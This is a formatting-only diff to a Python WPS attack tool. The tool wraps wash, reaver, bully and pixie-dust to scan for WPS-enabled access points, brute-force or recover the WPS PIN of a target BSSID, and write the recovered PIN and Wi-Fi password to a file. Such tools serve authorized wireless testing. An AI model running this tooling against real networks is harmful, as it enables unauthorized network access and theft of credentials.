@@ -20,12 +20,17 @@ from utils import check_monitor_mode, require_root, setup_logging, validate_mac
 
 
 class WPSAttack:
-    def __init__(self, interface: str, target_bssid: str,
-                 channel: Optional[int] = None,
-                 method: str = "reaver", timeout: int = 300,
-                 pixie_dust: bool = False,
-                 pin: Optional[str] = None,
-                 output_dir: str = "captures") -> None:
+    def __init__(
+        self,
+        interface: str,
+        target_bssid: str,
+        channel: Optional[int] = None,
+        method: str = "reaver",
+        timeout: int = 300,
+        pixie_dust: bool = False,
+        pin: Optional[str] = None,
+        output_dir: str = "captures",
+    ) -> None:
         self.interface: str = interface
         self.target_bssid: str = target_bssid.upper()
         self.channel: Optional[int] = channel
@@ -66,23 +71,32 @@ class WPSAttack:
         try:
             result = subprocess.run(
                 ["wash", "-i", self.interface, "-s"],
-                capture_output=True, text=True, timeout=30,
+                capture_output=True,
+                text=True,
+                timeout=30,
             )
             targets = []
             for line in result.stdout.strip().split("\n"):
                 line = line.strip()
-                if not line or line.startswith("Wash") or line.startswith("---") or line.startswith("BSSID"):
+                if (
+                    not line
+                    or line.startswith("Wash")
+                    or line.startswith("---")
+                    or line.startswith("BSSID")
+                ):
                     continue
                 parts = line.split()
                 if len(parts) >= 6:
-                    targets.append({
-                        "bssid": parts[0],
-                        "channel": int(parts[1]) if parts[1].isdigit() else None,
-                        "rssi": int(parts[2]) if parts[2].lstrip("-").isdigit() else None,
-                        "wps_version": parts[3],
-                        "wps_locked": parts[4].lower() == "yes",
-                        "ssid": " ".join(parts[5:]),
-                    })
+                    targets.append(
+                        {
+                            "bssid": parts[0],
+                            "channel": int(parts[1]) if parts[1].isdigit() else None,
+                            "rssi": int(parts[2]) if parts[2].lstrip("-").isdigit() else None,
+                            "wps_version": parts[3],
+                            "wps_locked": parts[4].lower() == "yes",
+                            "ssid": " ".join(parts[5:]),
+                        }
+                    )
 
             self.logger.info("Found %d WPS-enabled targets", len(targets))
             return targets
@@ -125,7 +139,9 @@ class WPSAttack:
 
         try:
             self._process = subprocess.Popen(
-                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
             )
 
             output_lines = []
@@ -232,7 +248,9 @@ class WPSAttack:
                 f.write(f"Method: {self.method}\n")
                 f.write(f"PIN: {result.get('pin', 'N/A')}\n")
                 f.write(f"PSK: {result.get('psk', 'N/A')}\n")
-                f.write(f"Time: {self._result.get('start_time', '')} - {self._result.get('end_time', '')}\n")
+                f.write(
+                    f"Time: {self._result.get('start_time', '')} - {self._result.get('end_time', '')}\n"
+                )
             self.logger.info("Result saved to %s", filepath)
         except Exception as e:
             self.logger.error("Failed to save result: %s", e)
@@ -273,23 +291,26 @@ Note: Requires reaver and/or bully installed.
         """,
     )
 
-    parser.add_argument("-i", "--interface", required=True,
-                        help="Wireless interface in monitor mode")
-    parser.add_argument("-b", "--bssid", required=True,
-                        help="Target AP BSSID")
-    parser.add_argument("-ch", "--channel", type=int,
-                        help="Target AP channel")
-    parser.add_argument("-m", "--method", default="reaver",
-                        choices=["reaver", "bully", "pixie-dust"],
-                        help="Attack method (default: reaver)")
-    parser.add_argument("--pin",
-                        help="Test specific WPS PIN")
-    parser.add_argument("-t", "--timeout", type=int, default=300,
-                        help="Attack timeout in seconds (default: 300)")
-    parser.add_argument("-o", "--output-dir", default="captures",
-                        help="Output directory (default: captures)")
-    parser.add_argument("-v", "--verbose", action="store_true",
-                        help="Verbose output")
+    parser.add_argument(
+        "-i", "--interface", required=True, help="Wireless interface in monitor mode"
+    )
+    parser.add_argument("-b", "--bssid", required=True, help="Target AP BSSID")
+    parser.add_argument("-ch", "--channel", type=int, help="Target AP channel")
+    parser.add_argument(
+        "-m",
+        "--method",
+        default="reaver",
+        choices=["reaver", "bully", "pixie-dust"],
+        help="Attack method (default: reaver)",
+    )
+    parser.add_argument("--pin", help="Test specific WPS PIN")
+    parser.add_argument(
+        "-t", "--timeout", type=int, default=300, help="Attack timeout in seconds (default: 300)"
+    )
+    parser.add_argument(
+        "-o", "--output-dir", default="captures", help="Output directory (default: captures)"
+    )
+    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
 
     args = parser.parse_args()
     require_root()
@@ -327,9 +348,9 @@ Note: Requires reaver and/or bully installed.
 
     result = attacker.attack()
 
-    print(f"\n{'='*60}")
+    print(f"\n{'=' * 60}")
     print("WPS Attack Result")
-    print(f"{'='*60}")
+    print(f"{'=' * 60}")
     print(f"Status:  {result['status']}")
     print(f"Method:  {result['method']}")
     if result["pin"]:
